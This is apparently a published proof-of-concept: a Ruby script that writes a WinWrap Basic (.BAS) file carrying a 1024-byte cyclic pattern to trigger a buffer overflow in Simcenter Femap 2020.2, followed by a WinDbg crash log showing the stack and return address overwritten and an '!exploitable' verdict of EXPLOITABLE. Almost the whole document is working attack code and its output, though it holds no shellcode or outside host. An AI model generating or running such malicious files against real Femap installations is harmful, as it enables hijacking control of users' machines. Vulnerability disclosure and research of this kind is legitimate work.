#!/usr/bin/env ruby
# Simcenter Femap Version 2020.2.MP2 WinWrap Basic Language Buffer Overflow
# Tools/Programming/API Programming

require 'rex'

fuzz = Rex::Text.pattern_create(1024)

bas = %Q|Sub Main
        lalo = Dafuq("#{fuzz}")
End Sub
|

fd = File.new('lalo.BAS','wb')
fd.write(bas)
fd.close
__END__
(1e98.668): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
femap+0xa7e2bd:
00000001`40a7e2bd c3              ret
0:000> r
rax=00000000000000b9 rbx=3967423867423767 rcx=0000000000000000
rdx=0000000000000010 rsi=4234684233684232 rdi=6842316842306842
rip=0000000140a7e2bd rsp=00000000013368b8 rbp=0000000002142880
 r8=0000000001c81d6d  r9=0000000000000000 r10=0000000000000000
r11=0000000001c81d30 r12=00000000000003e8 r13=0000000000000018
r14=0000000000000000 r15=0000000000000005
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
femap+0xa7e2bd:
00000001`40a7e2bd c3              ret
0:000> kv
 # Child-SP          RetAddr           : Args to Child                                                           : Call Site
00 00000000`013368b8 37684236`68423568 : 69423968`42386842 00200a0d`29224230 00000000`00005f31 00000000`17c1a968 : femap+0xa7e2bd
01 00000000`013368c0 69423968`42386842 : 00200a0d`29224230 00000000`00005f31 00000000`17c1a968 00000000`17c36308 : 0x37684236`68423568
02 00000000`013368c8 00200a0d`29224230 : 00000000`00005f31 00000000`17c1a968 00000000`17c36308 00000000`00000000 : 0x69423968`42386842
03 00000000`013368d0 00000000`00005f31 : 00000000`17c1a968 00000000`17c36308 00000000`00000000 ffffffff`fffffffe : 0x00200a0d`29224230
04 00000000`013368d8 00000000`17c1a968 : 00000000`17c36308 00000000`00000000 ffffffff`fffffffe 00000000`17c389d8 : 0x5f31
05 00000000`013368e0 00000000`17c36308 : 00000000`00000000 ffffffff`fffffffe 00000000`17c389d8 00000000`00000000 : 0x17c1a968
06 00000000`013368e8 00000000`00000000 : ffffffff`fffffffe 00000000`17c389d8 00000000`00000000 00000000`00000000 : 0x17c36308
0:000> !exploitable

!exploitable 1.6.0.0
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Read Access Violation on Control Flow starting at femap+0x0000000000a7e2bd (Hash=0x7e485006.0x410e1ef5)

Access violations not near null in control flow instructions are considered exploitabl

